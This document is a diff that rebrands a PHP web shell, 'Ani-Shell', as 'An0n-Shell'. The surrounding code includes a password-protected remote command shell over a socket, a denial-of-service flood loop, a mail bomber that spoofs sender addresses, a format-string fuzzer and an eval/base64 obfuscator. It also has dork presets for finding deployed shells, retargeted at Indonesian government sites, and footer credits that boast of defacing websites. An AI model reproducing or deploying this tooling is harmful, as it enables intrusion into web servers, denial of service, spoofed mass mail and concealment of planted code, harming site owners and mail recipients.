@@ -787,7 +787,7 @@ function exec_query_mysql($query,$sql_server,$sql_port,$sql_db,$sql_user,$sql_pa
         <tr>
             <td width="300px;">
             <div class="logo">
-                <img src="http://ani-shell.sourceforge.net/banner.jpg" />
+                <img src="https://raw.githubusercontent.com/faizal-acbar/anon-shell/master/cooltext330175651922325.png" />
             </div>
             </td>
             <td>
@@ -1493,7 +1493,7 @@ else if(isset($_GET['gdork']))
                         intitle
                     </td>
                     <td>
-                         <input class="cmd" name="title" value="Ani-Shell"/>
+                         <input class="cmd" name="title" value="An0n-Shell"/>
                     </td>
                 </tr>
                 <tr>
@@ -1501,7 +1501,7 @@ else if(isset($_GET['gdork']))
                     intext
                 </td>
                 <td>
-                    <input class="cmd" name="text" value="lionaneesh" />
+                    <input class="cmd" name="text" value="inC7" />
                 </td>
                 </tr>
                 <tr>
@@ -1509,7 +1509,7 @@ else if(isset($_GET['gdork']))
                         inurl
                     </td>
                     <td>
-                         <input class="cmd" name="url" value="Ani-Shell.php"/>
+                         <input class="cmd" name="url" value="An0n-Shell.php"/>
                     </td>
                 </tr>
                 <tr>
@@ -1517,7 +1517,7 @@ else if(isset($_GET['gdork']))
                         site
                     </td>
                     <td>
-                         <input class="cmd" name="site" value="*.org"/>
+                         <input class="cmd" name="site" value="*.go.id"/>
                     </td>
                 </tr>
                 <tr>
@@ -1679,7 +1679,7 @@ else if(isset($_GET['connect']))
             while(1)
             {
                 // Print Command prompt
-                $commandPrompt ="(Ani-Shell)[$]> ";
+                $commandPrompt ="(An0n-Shell)[$]> ";
                 $maxCmdLen = 31337;
                 socket_write($client,$commandPrompt);
                 $cmd = socket_read($client,$maxCmdLen);
@@ -1747,12 +1747,12 @@ else if(isset($_GET['connect']))
                 <tr>
                     <td>Port</td>
                     <td>
-                        <input style="width: 200px;" class="cmd" name="port" value="31337" />
+                        <input style="width: 200px;" class="cmd" name="port" value="8080" />
                     </td>
                 </tr>
                 <tr>
                     <td>Passwd </td>
-                    <td><input style="width: 100px;" class="cmd" name="passwd" size='5' value="lionaneesh"/>
+                    <td><input style="width: 100px;" class="cmd" name="passwd" size='5' value="inC7"/>
                 </tr>
                 <tr>
                 <td>
@@ -1813,7 +1813,7 @@ else if(isset($_GET['fuzz']))
             $data .= urlencode($_GET['message']);
         }
         $data .= "%s%s%s%s%d%x%c%n%n%n%n";// add some format string specifiers
-        $data .= "by-Ani-shell".$ending;
+        $data .= "by-An0n-shell".$ending;
         $length = strlen($data);
 
 
@@ -1934,7 +1934,7 @@ else if(isset($_GET['dos']))
        {
             $data .= "X";
        }
-       $data .= "-by-Ani-Shell";
+       $data .= "-by-An0n-Shell";
        print "I am at ma Work now :D ;D! Dont close this window untill you recieve a message <br>";
 
        while(1)
@@ -2047,7 +2047,7 @@ else if(isset($_GET['bomb']))
                 $messagePadd = "\n\n------------------------------\n".rand(0,99999999);
 
             }
-            $from = "president$fromPadd@whitehouse.gov";
+            $from = "anonymouse$fromPadd@indonesian.id";
             if(!mail($_GET['to'],$_GET['subject'].$subjectPadd,$_GET['message'].$messagePadd,"From:".$from))
             {
                 $error = 1;
@@ -2106,7 +2106,7 @@ else if(isset($_GET['bomb']))
                 </tr>
                 <tr>
                     <td colspan="2">
-                        <textarea name="message" cols="110" rows="10" class="cmd">Ani-Shell Rocks!!</textarea>
+                        <textarea name="message" cols="110" rows="10" class="cmd">An0n-Shell Rocks!!</textarea>
                     </td>
                 </tr>
 
@@ -2154,7 +2154,7 @@ else if(isset($_GET['mail']))
                         From
                     </td>
                     <td>
-                        <input class="cmd" name="from" value="president@whitehouse.gov" onfocus="if(this.value == 'president@whitehouse.gov')this.value = '';" onblur="if(this.value=='')this.value='president@whitehouse.gov';"/>
+                        <input class="cmd" name="from" value="anonymouse@indonesia.id" onfocus="if(this.value == 'anonymouse@indonesia.id')this.value = '';" onblur="if(this.value=='')this.value='anonymouse@indonesia.id';"/>
                     </td>
                 </tr>
 
@@ -2232,7 +2232,7 @@ else if(isset($_GET['obfuscate']))
 <?php
 $encoded = \''.$encoded.'\';
 eval(gzinflate(base64_decode($encoded)));
-// Script Encoded by Ani-Shell
+// Script Encoded by An0n-Shell
 ?>
 ';
     }
@@ -2445,10 +2445,9 @@ else
 </div>
 
 <div class="end" id='footer' style="margin-top: 20px;">
-<p align="center"><b>(C) Copyright lionaneesh [All rights reserved]</b><br />
-(: <a href="http://twitter.com/lionaneesh">Follow Me</a> | <a href="http://facebook.com/lionaneesh">Facebook</a> :) <br />
-\m/ <b>Greetz to</b> : LuCky , Aasim Bhai aKa R00tD3vil , and all ICA and Indishell Members! We'll Always rock \m/<br />
-All I remember were those lonely nights when I was defacing those insecure websites
+<p align="center"><b>&copyCopyright inC7 All rights reserved</b><br />
+(: <a href="http://www.facebook.com/rudyozog">Facebook</a> :) <br />
+\m/ <b>Greetz to</b> : Mr.L00L - Mr.Newbie - Mr.??? - BlackHat4you - inC7 - Mr.Mux - Askin Cressida - Omest - Zak - Vijune15 - Inyour Good - Extazy - Worm ID 
 </p>
 </div>
 
